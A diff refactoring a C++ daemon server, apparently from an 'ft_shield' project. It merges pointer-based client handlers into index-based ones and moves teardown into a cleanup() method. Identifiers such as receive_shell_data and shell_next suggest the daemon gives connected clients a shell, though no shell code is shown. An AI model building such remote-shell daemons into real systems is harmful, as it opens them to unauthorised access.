@@ -21,7 +21,15 @@ void handle_signals(int sig)
 	return ;
 }
 
-DaemonServer::DaemonServer()
+void DaemonServer::cleanup() {
+	for (size_t i = 0; i < FT_SHIELD_MAX_CLIENTS; i++) {
+		if (this->client_list[i].state != CLIENT_UNUSED)
+			this->disconnect_client(i);
+	}
+	close(this->pollfd_array[0].fd);
+}
+
+int DaemonServer::init()
 {
 	if (FT_SHIELD_MAX_CLIENTS >= 1)
 		this->should_accept = true;
@@ -51,18 +59,7 @@ DaemonServer::DaemonServer()
 	}
 	this->shell_next = false;
 	this->current_conn = 0;
-}
 
-DaemonServer::~DaemonServer() {
-	for (size_t i = 0; i < FT_SHIELD_MAX_CLIENTS; i++) {
-		if (this->client_list[i].state != CLIENT_UNUSED)
-			this->disconnect_client(i);
-	}
-	close(this->pollfd_array[0].fd);
-}
-
-int DaemonServer::init()
-{
 #if MATT_MODE
 	if (this->logger.init(MATT_LOGFILE_DIR, MATT_LOGFILE) != 0)
 		return 1;
@@ -238,15 +235,11 @@ void DaemonServer::clear_client(client_t *client)
 	client->output_buffer.clear();
 }
 
-void DaemonServer::clear_client(size_t client_index)
+void DaemonServer::disconnect_client(size_t client_index)
 {
 	if (client_index >= FT_SHIELD_MAX_CLIENTS)
 		return ;
-	clear_client(&this->client_list[client_index]);
-}
-
-void DaemonServer::disconnect_client(client_t *client)
-{
+	client_t *client = &(this->client_list[client_index]);
 	if (client == NULL)
 		return ;
 
@@ -255,15 +248,11 @@ void DaemonServer::disconnect_client(client_t *client)
 	this->current_conn--;
 }
 
-void DaemonServer::disconnect_client(size_t client_index)
+bool DaemonServer::receive_message(size_t client_index)
 {
 	if (client_index >= FT_SHIELD_MAX_CLIENTS)
-		return ;
-	disconnect_client(&this->client_list[client_index]);
-}
-
-bool DaemonServer::receive_message(client_t *client)
-{
+		return (true);
+	client_t *client = &(this->client_list[client_index]);
 	if (client == NULL || client->state == CLIENT_UNUSED)
 		return (true);
 
@@ -349,15 +338,11 @@ void print_client_info(client_t *client)
 # define print_client_info(x)
 #endif
 
-bool DaemonServer::receive_message(size_t client_index)
+void DaemonServer::send_message(size_t client_index)
 {
 	if (client_index >= FT_SHIELD_MAX_CLIENTS)
-		return (true);
-	return (receive_message(&this->client_list[client_index]));
-}
-
-void DaemonServer::send_message(client_t *client)
-{
+		return ;
+	client_t *client = &(this->client_list[client_index]);
 	if (client == NULL || client->state == CLIENT_UNUSED || client->output_buffer.empty())
 		return ;
 
@@ -376,15 +361,11 @@ void DaemonServer::send_message(client_t *client)
 	client->pollfd->events &= ~POLLOUT; // remove pollout from events to check
 }
 
-void DaemonServer::send_message(size_t client_index)
+void DaemonServer::check_activity(size_t client_index)
 {
 	if (client_index >= FT_SHIELD_MAX_CLIENTS)
 		return ;
-	send_message(&this->client_list[client_index]);
-}
-
-void DaemonServer::check_activity(client_t *client)
-{
+	client_t *client = &(this->client_list[client_index]);
 	if (client == NULL)
 		return ;
 
@@ -394,13 +375,6 @@ void DaemonServer::check_activity(client_t *client)
 	{
 		client->state = CLIENT_DISCONNECTED;	// set client to be disconnected
 	}
-}
-
-void DaemonServer::check_activity(size_t client_index)
-{
-	if (client_index >= FT_SHIELD_MAX_CLIENTS)
-		return ;
-	check_activity(&this->client_list[client_index]);
 }
 
 void DaemonServer::receive_shell_data(size_t client_index)
